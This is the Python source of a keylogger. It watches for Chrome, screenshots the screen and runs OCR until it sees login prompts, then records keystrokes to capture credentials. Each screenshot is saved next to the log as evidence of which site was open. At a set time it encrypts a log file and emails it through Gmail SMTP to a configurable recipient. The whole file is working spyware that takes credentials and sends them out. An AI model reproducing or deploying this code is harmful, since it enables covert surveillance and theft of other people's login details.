from pynput import keyboard
import logging
import psutil
import datetime
import sys
import time
from PIL import ImageGrab
import pytesseract
from cryptography.fernet import Fernet
from email.message import EmailMessage
import ssl
import smtplib


class KeyLogger():
    '''
        @Brief: Constructor / initialise function
        @Param: Stop time for the program to stop loggging
        @Return: None
    '''
    def __init__(self,stopTime):
        self.stopTime = stopTime
        
        self.count = 0
        
        self.stopLogging = False
        
        logging.basicConfig(filename="../LoggedFile.txt",level=logging.DEBUG,format="%(message)s")

    '''
        @Brief: On every key press this function is called.
                Stops logging if enter is pressed and returns to spying
        @Param: The key pressed
        @Return: None
    '''
    def onPress(self, key):
        logging.debug(key)
        
        if key == keyboard.Key.enter:
            
            self.stopLogging = True
            
            # print("Enter  Pressed")
            self.spy()
            #exit(0)

    '''
        @Brief: Bind keyboard listener with the onpress argument to call onPress function
        @Param: None
        @Return: None
    '''
    def beginLog(self):


        with keyboard.Listener(on_press=self.onPress) as silent:
            silent.join()
        return

    '''
        @Brief: Loops and checks if chrome is launched / running
        @Param: None
        @Return: None
    '''
    def listenForInternet(self):

        while True:
            # Check if chrome.exe is running
            for proc in psutil.process_iter():
                
                if proc.name() == "chrome.exe":
                    #print('Chrome Launched')
                    return True
            time.sleep(1)

    '''
        @Brief: Takes use of pytesseracts image to text feature and scans for the specified 
                words. If detected, takes a screenshot and saves then begins logging
        @Param: None
        @Return: None
    '''
    def spy(self):

        self.stopLogging = False
        # print("Spying ...")
        self.count += 1

        while True:
            time.sleep(3)
            
            if (datetime.datetime.now() >= self.stopTime): # If specified time is reached send email of encrypted log file
                self.sendEmail()

            screenshot = ImageGrab.grab()   # Taking screenshot and using pytesseract image_to_string function to read
                                            # the words in the screenshot
            text = pytesseract.image_to_string(screenshot)
            
            if "Sign in" in text or "Log in" in text:
                
                screenshot.save('../captures/potentialLogIn'+str(self.count)+'.png')
                # print("Detected Image Saved") testing purposes

                data = open("../LoggedFile.txt", "a")
                
                data.write("-- LOG IN DETECTED --:\nCheck image potentialLogIn"+str(self.count)+" for website.\n"
                                                                                           "Below is login details.\n")
                data.write(str(datetime.datetime.now())+" \n")
                data.close()
                self.beginLog()
            else:
                continue
                # print("Not Detected") testing purposes

    '''
        @Brief: Opens the log file and encrypts the data inside using AES 128 bit 
                encryption
        @Param: None
        @Return: None
    '''
    def encryptLogFile(self):
        
        dataFile = open("../data.txt", "r")
        
        data = dataFile.read()
        
        key = Fernet.generate_key()
        
        fn = Fernet(key)
        
        encryptedData = fn.encrypt(data.encode())
        return encryptedData

    '''
        @Brief: Sends an email to desired target address containing encrypted log file
        @Param: None
        @Return: None
    '''
    def sendEmail(self):
        # Enter your email and target email. The secret variable is the password for third party applications
        # to access your email which you will need to enable and will receive a special code.
        sender = "" 

        secret = ""

        reciever = ""


        subject = "Your encrypted log file"
        body = str(self.encryptLogFile())


        em = EmailMessage()

        em['From'] = sender

        em['To'] = reciever

        em['Subject'] = subject

        em.set_content(body)


        context = ssl.create_default_context()
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:

            smtp.login(sender, secret)

            smtp.sendmail(sender, reciever, em.as_string())

        sys.exit(0)

    '''
        @Brief: Runs the logger 
        @Param: None
        @Return: None
    '''
    def run(self):
        if self.listenForInternet():
            self.spy()





